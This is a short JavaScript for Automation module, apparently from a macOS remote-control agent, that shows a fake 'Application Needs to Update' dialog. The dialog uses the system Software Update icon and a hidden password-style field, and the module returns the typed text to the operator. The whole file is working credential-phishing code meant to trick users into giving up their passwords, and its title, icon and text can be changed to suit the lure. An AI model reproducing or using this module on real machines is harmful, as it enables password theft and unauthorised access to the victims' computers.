exports.prompt = function(task, command, params){
    let config = [];
	if(params.length > 0){config = JSON.parse(params);}
	else{config = [];}
	let title = "Application Needs to Update";
	if(config.hasOwnProperty("title") && config['title'] !== ""){title = config['title'];}
	let icon = "/System/Library/CoreServices/Software Update.app/Contents/Resources/SoftwareUpdate.icns";
	if(config.hasOwnProperty("icon") && config['icon'] !== ""){icon = config['icon'];}
	let text = "An application needs permission to update";
	if(config.hasOwnProperty("text") && config['text'] !== ""){text = config['text'];}
	let answer = "";
	if(config.hasOwnProperty("answer") && config['answer'] !== ""){answer = config['answer'];}
	try{
		let prompt = currentApp.displayDialog(text, {
			defaultAnswer: answer,
			buttons: ['OK', 'Cancel'], 
			defaultButton: 'OK',
			cancelButton: 'Cancel', 
			withTitle: title,  
			withIcon: Path(icon),
			hiddenAnswer: true 
		});
		return {"user_output":prompt.textReturned, "completed": true};
	}catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
	}
};
